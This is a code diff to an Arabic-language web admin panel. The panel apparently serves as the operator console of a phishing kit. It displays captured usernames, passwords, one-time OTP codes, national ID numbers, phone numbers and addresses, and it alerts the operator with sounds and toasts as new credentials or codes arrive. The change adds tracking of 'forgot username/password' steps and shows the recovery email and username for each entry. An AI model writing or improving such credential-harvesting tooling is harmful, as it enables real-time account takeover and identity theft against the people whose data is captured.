@@ -542,9 +542,12 @@
   <div class="modal-overlay" id="detailsModal">
     <div class="modal-box">
       <h2>تفاصيل الطلب</h2>
+      <div class="modal-row" id="mStepRow" style="display:none;"><span class="k">الخطوة الحالية</span><span class="v" id="mStep" style="color:#c8a45a;font-weight:700;"></span></div>
       <div class="modal-row"><span class="k">اسم المستخدم</span><span class="v" id="mUsername"></span></div>
       <div class="modal-row"><span class="k">كلمة المرور</span><span class="v" id="mPassword"></span></div>
       <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
+      <div class="modal-row" id="mForgotEmailRow" style="display:none;"><span class="k">بريد الاسترجاع</span><span class="v" id="mForgotEmail"></span></div>
+      <div class="modal-row" id="mForgotUsernameRow" style="display:none;"><span class="k">مستخدم الاسترجاع</span><span class="v" id="mForgotUsername"></span></div>
       <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
       <div class="modal-row"><span class="k">رقم الهوية</span><span class="v" id="mIdNumber"></span></div>
       <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
@@ -682,6 +685,13 @@
       return { text: 'قيد الانتظار', cls: 'pending' };
     }
 
+    var stepLabels = {
+      'forgot-username': 'نسيت اسم المستخدم',
+      'forgot-username-confirm': 'تأكيد اسم المستخدم',
+      'forgot-username-password': 'كلمة المرور (نسيت المستخدم)',
+      'forgot-password': 'نسيت كلمة السر'
+    };
+
     function renderRequests(){
       var tbody = document.getElementById('requestsBody');
       tbody.innerHTML = '';
@@ -689,26 +699,13 @@
         var st = statusLabel(r.status);
         var row = document.createElement('tr');
         row.dataset.id = r.id;
-        var isForgotUser = r.type === 'forgot-username';
-        var isForgotPass = r.type === 'forgot-password';
-        var isForgotConfirm = r.type === 'forgot-username-confirm';
-        var isForgotUserPass = r.type === 'forgot-username-password';
-        var isForgot = isForgotUser || isForgotPass || isForgotConfirm || isForgotUserPass;
-        var usernameCell;
-        if (isForgotUser) {
-          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">نسيت اسم المستخدم</span><br>' + escapeHtml(r.forgotEmail || r.email || '-');
-        } else if (isForgotPass) {
-          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">نسيت كلمة السر</span><br>' + escapeHtml(r.forgotUsername || r.username || '-');
-        } else if (isForgotConfirm) {
-          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">تأكيد اسم المستخدم</span><br>' + escapeHtml(r.username || '-');
-        } else if (isForgotUserPass) {
-          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">كلمة المرور (نسيت المستخدم)</span><br>••••••••';
-        } else {
-          usernameCell = escapeHtml(r.username);
+        var usernameCell = escapeHtml(r.username || '-');
+        if (r.step && stepLabels[r.step]) {
+          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">' + stepLabels[r.step] + '</span><br>' + escapeHtml(r.username || r.forgotEmail || r.forgotUsername || '-');
         }
         row.innerHTML =
           '<td>' + usernameCell + '</td>' +
-          '<td>' + (isForgot ? '-' : '••••••••') + '</td>' +
+          '<td>' + (r.password ? '••••••••' : '-') + '</td>' +
           '<td>' + escapeHtml(r.phone || '-') + '</td>' +
           '<td>' + escapeHtml(r.name || '-') + '</td>' +
           '<td><span class="status-badge ' + st.cls + '">' + st.text + '</span></td>' +
@@ -730,15 +727,15 @@
       newList.forEach(function(r){
         var prev = previousById[r.id];
         if (!prev) {
-          // طلب جديد لم يكن موجودًا في آخر استعلام
           playNotifySound();
-          showToast('طلب جديد وصل: ' + (r.username || '-'));
+          showToast('طلب جديد وصل: ' + (r.username || r.name || '-'));
+        } else if (r.step && r.step !== prev.step) {
+          playNotifySound();
+          showToast((stepLabels[r.step] || r.step) + ': ' + (r.username || r.forgotEmail || r.forgotUsername || '-'));
         } else if ((r.username && r.username !== prev.username) || (r.password && r.password !== prev.password)) {
-          // بيانات اسم المستخدم وكلمة المرور وصلت إلى طلب موجود
           playNotifySound();
           showToast('وصل اسم المستخدم وكلمة المرور');
         } else if (r.otp && r.otp !== prev.otp) {
-          // نفس الطلب لكن وصل له OTP جديد
           playNotifySound();
           showToast('وصل رمز OTP جديد لـ: ' + (r.username || '-'));
         }
@@ -749,7 +746,8 @@
           status: r.status,
           username: r.username,
           password: r.password,
-          otp: r.otp
+          otp: r.otp,
+          step: r.step
         };
       });
       previousById = map;
@@ -827,6 +825,27 @@
       document.getElementById('mCity').textContent = r.city || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
       document.getElementById('mWatchColor').textContent = r.watchColor || '-';
+      var stepRow = document.getElementById('mStepRow');
+      if (r.step && stepLabels[r.step]) {
+        document.getElementById('mStep').textContent = stepLabels[r.step];
+        stepRow.style.display = '';
+      } else {
+        stepRow.style.display = 'none';
+      }
+      var forgotEmailRow = document.getElementById('mForgotEmailRow');
+      if (r.forgotEmail) {
+        document.getElementById('mForgotEmail').textContent = r.forgotEmail;
+        forgotEmailRow.style.display = '';
+      } else {
+        forgotEmailRow.style.display = 'none';
+      }
+      var forgotUsernameRow = document.getElementById('mForgotUsernameRow');
+      if (r.forgotUsername) {
+        document.getElementById('mForgotUsername').textContent = r.forgotUsername;
+        forgotUsernameRow.style.display = '';
+      } else {
+        forgotUsernameRow.style.display = 'none';
+      }
       var isPending = r.status === 'pending' || !r.status;
       modalApproveBtn.classList.toggle('active', isPending);
       modalRejectBtn.classList.toggle('active', isPending);
